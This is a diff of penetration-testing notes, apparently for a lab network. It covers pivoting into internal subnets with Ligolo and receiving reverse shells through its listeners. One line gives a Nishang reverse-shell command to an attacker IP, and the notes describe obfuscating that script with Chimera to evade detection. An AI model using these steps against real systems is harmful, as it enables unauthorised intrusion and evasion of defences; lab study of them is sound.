@@ -359,6 +359,23 @@ One way to verify our Pivot is working is to use "crackmapexec" if SMB or WINRM 
 
 `crackmapexec smb 192.168.0.1/24` - if its able to resolve the  names of the live host in the Subnet, then it's working :)
 
+#### From here:
+
+Now we have access to the internal networks of our Jump Host directly from our kali machine.
+
+We find an exploit for the internal network, then send the agent file into the iNternal network, connecting back to the proxy on kali.
+
+Rinse and Repeat the step for multiple Networks/Subnets...
+
+{% hint style="info" %}
+The notes below are optional and not necessary:
+
+<mark style="color:red;">**You can use Ligolo for Pivoting and Transfering files to and from internal networks without using any Listener !!**</mark>
+
+* How to use ligolo listeners to receive Rev Shell
+* How to use ligolo listeners to transfer files between hosts.
+{% endhint %}
+
 #### <mark style="color:orange;">How to use the Ligolo Listeners to receive a reverse shell connection</mark>
 
 After gaining access to internal networks, in this case "10.200.87.150".  Lets say we found an exploit for this machine, like an RCE or something, and we want to send the reverse shell straight to our kali box, we need to add a Listener to our Ligolo Agent.
@@ -953,7 +970,7 @@ I used this [tool](https://github.com/tokyoneon/Chimera) to obfuscate the nishan
 
 <figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
-`Invoke-PowerShellTcp -Reverse -IPAddress`` ``10.50.88.51 -Port 9002` like this. I named it `inv.ps1` .
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.50.88.51 -Port 9002` like this. I named it `inv.ps1` .
 
 4\. Finally obfuscate the script with chimera using the following command. The obfuscated script will be at located at `/tmp/chimera.ps1`
 
